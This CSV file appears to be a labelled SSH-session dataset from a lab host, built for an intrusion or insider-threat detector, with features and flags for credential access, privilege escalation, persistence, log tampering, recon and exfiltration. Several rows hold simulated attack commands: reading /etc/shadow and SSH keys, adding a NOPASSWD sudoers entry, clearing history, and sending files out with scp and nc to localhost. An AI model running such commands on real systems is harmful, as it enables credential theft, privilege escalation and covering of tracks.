session_id,user,account,client_ip,target_ip,target_hostname,session_start,session_end,duration_sec,session_start_is_estimated,session_end_is_estimated,duration_sec_is_estimated,commands,event_types,raw_event_count,file_transfer_bytes,protocol,has_command_telemetry,start_time,end_time,duration_sec_feat,start_hour,off_hours_flag,is_weekend,command_count,unique_command_ratio,avg_command_length,command_entropy,flag_cred_access,flag_privesc,flag_persistence,flag_log_tamper,flag_recon,flag_exfil
19f94969850a84c3000c291af8a6,test-ssh,svc-debian,192.168.1.32,192.168.1.74,debian-lab,2026-07-24T14:08:08.928000+00:00,2026-07-24T14:08:08.928000+00:00,0,True,True,True,['whoami'],['KBD_INPUT'],1,0,SSH,1,2026-07-24 14:08:08.928000+00:00,2026-07-24 14:08:08.928000+00:00,0.0,14,0,0,1.0,1.0,6.0,-0.0,0.0,0.0,0.0,0.0,1.0,0.0
19f94e38158d9f6b000c291af8a6,test-ssh,svc-debian,192.168.1.32,192.168.1.74,debian-lab,2026-07-24T15:32:14.045000+00:00,2026-07-24T15:33:20.572000+00:00,67,True,True,True,"['whoami', 'cat /etc/shadow', 'whoami<NL>id', 'uname -a', 'netstat -tulpn 2>/dev/null || ss -tulpn<NL>w', 'last | head', 'cat /etc/passwd', 'cat /etc/sudoers', 'crontab -l 2>/dev/null || echo none', 'ls -la /etc/cron.d/', 'useradd -M -s /usr/sbin/nologin gt_tmp_user', 'cat /etc/shadow', 'cat /root/.ssh/authorized_keys 2>/dev/null || echo none', 'history -c', 'unset HISTFILE', 'base64 /tmp/gt_exfil.txt | head -c 50']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",16,0,SSH,1,2026-07-24 15:32:14.045000+00:00,2026-07-24 15:33:20.572000+00:00,67.0,15,0,0,16.0,0.9375,21.8125,3.875,1.0,1.0,1.0,1.0,1.0,0.0
19fa96ca2ffbc6f4000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-07-28T15:20:03.348000+00:00,2026-07-28T15:20:03.348000+00:00,0,True,True,True,['whoami'],['KBD_INPUT'],1,0,SSH,1,2026-07-28 15:20:03.348000+00:00,2026-07-28 15:20:03.348000+00:00,0.0,15,0,0,1.0,1.0,6.0,-0.0,0.0,0.0,0.0,0.0,1.0,0.0
19fb7dabd7dd5a83000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-07-31T10:34:59.365000+00:00,2026-07-31T10:38:04.856000+00:00,185,True,True,True,"['whoami', 'history -c', 'crontab -l']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",3,0,SSH,1,2026-07-31 10:34:59.365000+00:00,2026-07-31 10:38:04.856000+00:00,185.0,10,0,0,3.0,1.0,8.666666666666666,1.584962500721156,0.0,0.0,1.0,1.0,1.0,0.0
19fb7df1d3131f94000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-07-31T10:40:02.104000+00:00,2026-07-31T10:40:02.104000+00:00,0,True,True,True,['whoami '],['KBD_INPUT'],1,0,SSH,1,2026-07-31 10:40:02.104000+00:00,2026-07-31 10:40:02.104000+00:00,0.0,10,0,0,1.0,1.0,6.0,-0.0,0.0,0.0,0.0,0.0,1.0,0.0
19fb7e224bd6cdfa000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-07-31T10:43:06.094000+00:00,2026-07-31T10:43:16.595000+00:00,11,True,True,True,"['uname -a', 'last ', 'w']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",3,0,SSH,1,2026-07-31 10:43:06.094000+00:00,2026-07-31 10:43:16.595000+00:00,11.0,10,0,0,3.0,1.0,4.333333333333333,1.584962500721156,0.0,0.0,0.0,0.0,1.0,0.0
19fb7eb02f732c59000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-07-31T10:53:22.070000+00:00,2026-07-31T10:53:22.070000+00:00,0,True,True,True,['history -c '],['KBD_INPUT'],1,0,SSH,1,2026-07-31 10:53:22.070000+00:00,2026-07-31 10:53:22.070000+00:00,0.0,10,0,0,1.0,1.0,10.0,-0.0,0.0,0.0,0.0,1.0,0.0,0.0
19fb7f792db4cb0a000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-07-31T11:07:38.036000+00:00,2026-07-31T11:07:38.036000+00:00,0,True,True,True,['exit'],['KBD_INPUT'],1,0,SSH,1,2026-07-31 11:07:38.036000+00:00,2026-07-31 11:07:38.036000+00:00,0.0,11,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fb804341dbf83f000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-07-31T11:20:08.755000+00:00,2026-07-31T11:20:08.755000+00:00,0,True,True,True,['exit'],['KBD_INPUT'],1,0,SSH,1,2026-07-31 11:20:08.755000+00:00,2026-07-31 11:20:08.755000+00:00,0.0,11,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc75634f13c558000c291af8a6,test-ssh,svc-debian,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T10:43:57.346+0000,2026-08-03T10:44:14.830+0000,17,False,False,False,"['whoami', 'id', 'uname -a', 'netstat -tulnp', 'who', 'last -n 5']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,SSH,1,2026-08-03 10:43:57.346000+00:00,2026-08-03 10:44:14.830000+00:00,17.0,10,0,0,6.0,1.0,7.0,2.584962500721156,0.0,0.0,0.0,0.0,1.0,0.0
19fc759365dc3bb7000c291af8a6,test-ssh,svc-debian,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T10:47:14.582+0000,2026-08-03T10:47:45.840+0000,31,False,False,False,[],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'SESSION_DISCONNECTION']",2,0,SSH,1,2026-08-03 10:47:14.582000+00:00,2026-08-03 10:47:45.840000+00:00,31.0,10,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc772354807ec1000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:14:32.601+0000,2026-08-03T11:18:14.853+0000,222,False,False,False,[],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'SESSION_DISCONNECTION']",2,0,SSH,1,2026-08-03 11:14:32.601000+00:00,2026-08-03 11:18:14.853000+00:00,222.0,11,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc774cb1bedc3b000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:17:19.719+0000,2026-08-03T11:17:37.853+0000,17,False,False,False,[],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'SESSION_DISCONNECTION']",2,0,SSH,1,2026-08-03 11:17:19.719000+00:00,2026-08-03 11:17:37.853000+00:00,17.0,11,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc775611ef6278000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:17:58.103+0000,2026-08-03T11:18:02.103+0000,3,False,False,False,[],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'SESSION_DISCONNECTION']",2,0,SSH,1,2026-08-03 11:17:58.103000+00:00,2026-08-03 11:18:02.103000+00:00,3.0,11,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc7757dfcb3ed1000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:18:05.334+0000,2026-08-03T11:18:10.353+0000,4,False,False,False,[],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'SESSION_DISCONNECTION']",2,0,SSH,1,2026-08-03 11:18:05.334000+00:00,2026-08-03 11:18:10.353000+00:00,4.0,11,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc7759b3ce534a000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:18:13.209+0000,2026-08-03T11:18:19.603+0000,6,False,False,False,['who'],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'SESSION_DISCONNECTION']",3,0,SSH,1,2026-08-03 11:18:13.209000+00:00,2026-08-03 11:18:19.603000+00:00,6.0,11,0,0,1.0,1.0,3.0,-0.0,0.0,0.0,0.0,0.0,1.0,0.0
19fc775c2fa81cdb000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:18:23.581+0000,2026-08-03T11:18:30.184+0000,6,False,False,False,"['cat /etc/passwd', 'w', 'last -n 10']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:18:23.581000+00:00,2026-08-03 11:18:30.184000+00:00,6.0,11,0,0,3.0,1.0,8.666666666666666,1.584962500721156,1.0,0.0,0.0,0.0,1.0,0.0
19fc77603e10c35a000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:18:41.354+0000,2026-08-03T11:18:48.113+0000,6,False,False,False,"['useradd -m tempuser_atk_privesc_ac7d65', ""echo 'tempuser_atk_privesc_ac7d65 ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/tempuser_atk_privesc_ac7d65"", 'rm -f /etc/sudoers.d/tempuser_atk_privesc_ac7d65']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:18:41.354000+00:00,2026-08-03 11:18:48.113000+00:00,6.0,11,0,0,3.0,1.0,62.666666666666664,1.584962500721156,0.0,1.0,0.0,0.0,0.0,0.0
19fc776482e12f45000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:18:57.696+0000,2026-08-03T11:19:01.354+0000,3,False,False,False,"['(crontab -l 2>/dev/null; echo \\', 'crontab -l', 'crontab -l | grep -v atk_persistence_6cd12f | crontab -']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:18:57.696000+00:00,2026-08-03 11:19:01.354000+00:00,3.0,11,0,0,3.0,1.0,32.0,1.584962500721156,0.0,0.0,1.0,0.0,0.0,0.0
19fc7766735b5614000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:19:05.522+0000,2026-08-03T11:19:22.854+0000,17,False,False,False,['scp -o StrictHostKeyChecking=no /tmp/exfil_test_atk_exfil_6ccc34.txt root@127.0.0.1:/tmp/ 2>&1 | head -5'],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'SESSION_DISCONNECTION']",3,0,SSH,1,2026-08-03 11:19:05.522000+00:00,2026-08-03 11:19:22.854000+00:00,17.0,11,0,0,1.0,1.0,104.0,-0.0,0.0,0.0,0.0,0.0,0.0,1.0
19fc776b9db98bce000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:19:26.561+0000,2026-08-03T11:19:43.706+0000,17,False,False,False,"['cat /etc/shadow', 'find / -name id_rsa 2>/dev/null']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",4,0,SSH,1,2026-08-03 11:19:26.561000+00:00,2026-08-03 11:19:43.706000+00:00,17.0,11,0,0,2.0,1.0,23.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0
19fc777061ca1d3c000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:19:45.822+0000,2026-08-03T11:19:49.604+0000,3,False,False,False,"['history -c', 'last']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",4,0,SSH,1,2026-08-03 11:19:45.822000+00:00,2026-08-03 11:19:49.604000+00:00,3.0,11,0,0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0
19fc77723b0e7f6a000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:19:53.482+0000,2026-08-03T11:20:03.605+0000,9,False,False,False,"['whoami', 'id', 'uname -a', 'netstat -tulnp', 'who', 'last -n 5']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,SSH,1,2026-08-03 11:19:53.482000+00:00,2026-08-03 11:20:03.605000+00:00,9.0,11,0,0,6.0,1.0,7.0,2.584962500721156,0.0,0.0,0.0,0.0,1.0,0.0
19fc777daf21658f000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:20:40.370+0000,2026-08-03T11:20:44.355+0000,3,False,False,False,"['cat /etc/shadow', 'find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:20:40.370000+00:00,2026-08-03 11:20:44.355000+00:00,3.0,11,0,0,3.0,1.0,33.0,1.584962500721156,1.0,0.0,1.0,0.0,0.0,0.0
19fc777f6bbcb899000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:20:47.553+0000,2026-08-03T11:20:51.855+0000,4,False,False,False,"['scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_2c5f94.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_2c5f94.txt 2>&1']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",4,0,SSH,1,2026-08-03 11:20:47.553000+00:00,2026-08-03 11:20:51.855000+00:00,4.0,11,0,0,2.0,1.0,103.5,1.0,0.0,0.0,0.0,0.0,0.0,1.0
19fc77d5ced773b3000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:26:41.364+0000,2026-08-03T11:26:44.610+0000,3,False,False,False,[],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'SESSION_DISCONNECTION']",2,0,SSH,1,2026-08-03 11:26:41.364000+00:00,2026-08-03 11:26:44.610000+00:00,3.0,11,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc77d767d073af000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:26:48.053+0000,2026-08-03T11:26:52.109+0000,3,False,False,False,"['history -c', 'last']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",4,0,SSH,1,2026-08-03 11:26:48.053000+00:00,2026-08-03 11:26:52.109000+00:00,3.0,11,0,0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0
19fc77d8fcaaf4d6000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:26:54.361+0000,2026-08-03T11:26:59.360+0000,5,False,False,False,"['cat /etc/passwd', 'w', 'last -n 10']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:26:54.361000+00:00,2026-08-03 11:26:59.360000+00:00,5.0,11,0,0,3.0,1.0,8.666666666666666,1.584962500721156,1.0,0.0,0.0,0.0,1.0,0.0
19fc77db1a01071e000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:27:03.110+0000,2026-08-03T11:27:07.360+0000,4,False,False,False,"['scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_fb0163.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_fb0163.txt 2>&1']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",4,0,SSH,1,2026-08-03 11:27:03.110000+00:00,2026-08-03 11:27:07.360000+00:00,4.0,11,0,0,2.0,1.0,103.5,1.0,0.0,0.0,0.0,0.0,0.0,1.0
19fc77dd0a741231000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:27:10.882+0000,2026-08-03T11:27:17.360+0000,6,False,False,False,"['useradd -m tempuser_atk_privesc_cdb192', ""echo 'tempuser_atk_privesc_cdb192 ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/tempuser_atk_privesc_cdb192"", 'rm -f /etc/sudoers.d/tempuser_atk_privesc_cdb192']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:27:10.882000+00:00,2026-08-03 11:27:17.360000+00:00,6.0,11,0,0,3.0,1.0,62.666666666666664,1.584962500721156,0.0,1.0,0.0,0.0,0.0,0.0
19fc77df45181f96000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:27:20.110+0000,2026-08-03T11:27:24.109+0000,3,False,False,False,[],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'SESSION_DISCONNECTION']",2,0,SSH,1,2026-08-03 11:27:20.110000+00:00,2026-08-03 11:27:24.109000+00:00,3.0,11,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc77e0ed5c78b5000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:27:26.801+0000,2026-08-03T11:27:33.361+0000,6,False,False,False,['who'],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'SESSION_DISCONNECTION']",3,0,SSH,1,2026-08-03 11:27:26.801000+00:00,2026-08-03 11:27:33.361000+00:00,6.0,11,0,0,1.0,1.0,3.0,-0.0,0.0,0.0,0.0,0.0,1.0,0.0
19fc77e37cc3bba0000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:27:37.362+0000,2026-08-03T11:27:42.111+0000,4,False,False,False,[],"['SESSION_ESTABLISHED_SUCCESSFULLY', 'SESSION_DISCONNECTION']",2,0,SSH,1,2026-08-03 11:27:37.362000+00:00,2026-08-03 11:27:42.111000+00:00,4.0,11,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc77e57c0c116b000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T11:27:45.613+0000,2026-08-03T11:27:49.860+0000,4,False,False,False,"['(crontab -l 2>/dev/null; echo \\', 'crontab -l', 'crontab -l | grep -v atk_persistence_51f383 | crontab -']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",5,0,SSH,1,2026-08-03 11:27:45.613000+00:00,2026-08-03 11:27:49.860000+00:00,4.0,11,0,0,3.0,1.0,32.0,1.584962500721156,0.0,0.0,1.0,0.0,0.0,0.0
